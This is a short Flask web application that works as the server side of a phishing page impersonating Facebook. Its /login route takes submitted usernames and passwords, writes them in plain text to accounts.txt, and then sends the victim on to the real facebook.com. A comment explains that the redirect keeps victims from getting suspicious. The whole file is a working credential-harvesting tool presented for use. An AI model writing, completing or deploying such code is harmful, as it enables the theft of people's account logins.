from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # This creates the text file in your 'a' folder
    with open("accounts.txt", "a") as f:
        f.write(f"User: {username} | Pass: {password}\n")
    
    # Send them to the real FB so they don't get suspicious
    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    app.run(port=8000, debug=True)
